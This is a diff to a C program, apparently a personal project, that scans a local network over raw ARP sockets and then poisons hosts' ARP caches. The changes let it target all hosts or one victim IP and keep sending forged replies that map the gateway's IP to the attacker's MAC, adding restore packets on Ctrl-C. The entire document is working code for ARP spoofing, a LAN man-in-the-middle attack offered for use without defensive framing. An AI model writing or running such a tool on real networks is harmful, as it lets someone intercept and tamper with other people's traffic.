@@ -16,7 +16,7 @@
 #include "util.h"
 
 #define BUF_SIZE 4096
-#define DEFAULT_HOST 65536
+#define DEFAULT_HOST 65536 //Unrealistic, but...
 
 struct ether_addr;
 extern char * ether_ntoa(struct ether_addr *); //library fucntion
@@ -27,47 +27,44 @@ typedef struct
 	unsigned int ip;
 	unsigned int subnet;
 	unsigned char mac[6];
+	//unsigned char vendor[64];
 }host;
-
-static unsigned int vip; //Virtual IP
-
-typedef void (*routine)(int);
 
 void scanning(int);
 void spoofing(int);
-
-static host this;
-static host gateway;
-
+typedef void (*routine)(int); //Above function pointer
 static routine actions[3] = {scanning, spoofing, NULL};
 
-static host * host_list[DEFAULT_HOST];
+static unsigned int vip; //Virtual IP for host scan
+static unsigned int victim; //Victim IP
 
-static int is_end = 0;
+static host this; //This machine
+static host gateway; //Default gateway
+static host * host_list[DEFAULT_HOST]; //Other hosts
 
-static unsigned int my = 0;
+static int spoof_continue = 1;
+
+unsigned char etheraddr[32];
 
 int param_parse(int argc, char * argv[])
 {
 	static const char * usage = 
 		"#./arp hostscan {virtual source ip}\n" 
-		"#./arp spoof\n";
-	int ret;
+		"#./arp spoof {virtual source ip} {victim ip}\n\n"
+		"If you want to use only victim ip, put the virtual source ip as \'0.0.0.0\'\n";
 
-	if (argc <= 1) //명령이 주어지지 않음
+	int ret, idx = 1;
+
+	if (argc == 1) //명령이 주어지지 않음
 	{
 		printf("Usage\n%s", usage);
 		exit(-1);
 	}
 	else //명령이 있음
-	{
-		int idx = 1;
-
+	{	
 		if (!strcmp(argv[idx], "hostscan"))
 		{
 			ret = 0;
-			if (idx + 1 < argc) //추가 인자가 있음
-				vip = inet_addr(argv[idx + 1]);	
 		}
 		else if (!strcmp(argv[idx], "spoof"))
 		{
@@ -80,6 +77,11 @@ int param_parse(int argc, char * argv[])
 		}
 	}
 
+	if (idx + 1 < argc)
+		vip = inet_addr(argv[idx + 1]);
+	if (idx + 2 < argc)
+		victim = inet_addr(argv[idx + 2]);
+
 	return ret;	
 }
 
@@ -88,8 +90,7 @@ int init_base()
 	struct if_nameindex * if_arr, * itf;
 	struct ifreq ifr;
 	int sock, index, nr = 0;
-	
-		
+			
 	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 	if (sock < 0) //socket 사용 가능 여부 확인
 		goto socket_err;
@@ -224,6 +225,7 @@ void * reply_handle(void * arg)
 	
 	pthread_cleanup_push(reply_handle_cleanup, args);
 	*ptr_tot = 0; //reset
+
 	while (1)
 	{
 		int len = recvfrom(sock, buf, BUF_SIZE, 0, NULL, NULL);
@@ -287,12 +289,15 @@ void scanning(int idx)
 	memset(&device, 0, sizeof(device));
 	device.sll_ifindex = idx;
 	device.sll_halen = ETH_ALEN;
-	memset(device.sll_addr, 0xff, 6);
+	memset(device.sll_addr, 0xff, 6); //broadcast
 	
 	if (vip == 0)
 		which = this.ip;
 	else
 		which = vip;
+
+	if (max > 8192) //unrealistic
+		max = 8192;
 
 	printf("\tHost Scanning Start\n\n");
 
@@ -305,7 +310,7 @@ void scanning(int idx)
 		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
 		usleep(delay);
 	}
-	usleep(delay);
+	sleep(5); //wait for incoming reply packet,
 
 	printf("\n\tHost Scanning Finished\nThere are [%d] hosts, except you\n\n", *tot);
 
@@ -313,6 +318,14 @@ void scanning(int idx)
 	pthread_join(tid, NULL);
 	close(arp_sock);
 	free(tot);
+}
+
+void sighandle(int sig)
+{
+	if (sig == SIGINT)
+	{
+		spoof_continue = 0;
+	}
 }
 
 void * spoof_unit(void * arg)
@@ -323,20 +336,30 @@ void * spoof_unit(void * arg)
 	int * args = (int *)arg;
 	int if_index = args[0], t = args[1], arp_sock = args[2];
 	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
+	int cnt;
 
 	memset(&device, 0, sizeof(device));
 	device.sll_ifindex = if_index;
 	device.sll_halen = ETH_ALEN;
 	memcpy(device.sll_addr, host_list[t]->mac, 6);
 
-	while (1)
+	printf("Host: %d Spoofing START\n", t);
+
+	//create_arp_packet()이 loop밖에서 한번 초기화 시키고  재사용하면 잘 안되는 듯.
+	while (spoof_continue)
 	{
 		create_arp_packet(buf, ARPOP_REPLY, this.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
 		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
-		usleep(1000);
+		sleep(3);
 	}
 
-	//복구 패킷
+	//restore packet	
+	for (cnt = 0; cnt < 5; cnt++)
+	{
+		create_arp_packet(buf, ARPOP_REPLY, gateway.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
+		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
+		usleep(200);
+	}
 
 	free(args);
 	return NULL;
@@ -353,6 +376,10 @@ void spoofing(int idx) //default is for all hosts
 
 	scanning(idx);
 
+	if (max > 8192)
+		max = 8192;
+
+	signal(SIGINT, sighandle);
 	tids = malloc(sizeof(pthread_t) * max);
 	memset(tids, 0, sizeof(pthread_t) * max);
 
@@ -365,8 +392,8 @@ void spoofing(int idx) //default is for all hosts
 		if (host_list[t]->ip == gateway.ip)
 			continue;
 
-		//if (host_list[t]->ip != my)
-			//continue;
+		if (victim && host_list[t]->ip != victim)
+			continue;
 
 		args = (int *)malloc(sizeof(int) * 3);
 		args[0] = idx; args[1] = t; args[2] = arp_sock;
@@ -380,16 +407,18 @@ void spoofing(int idx) //default is for all hosts
 		}
 	}
 
-	printf("\tARP Spoofing Stop\n");
+	while (spoof_continue)
+		sleep(1);
+	printf ("\tTake a Moment Plz\n");
 
-	//쓰레드 정리
 	for (t = 1; t <= max; t++)
 	{
 		if (!tids[t])
 			continue;
-		pthread_cancel(tids[t]);
 		pthread_join(tids[t], NULL);
 	}
+
+	printf("\tARP Spoofing Stop\n");
 
 	free(tids);
 	close(arp_sock);
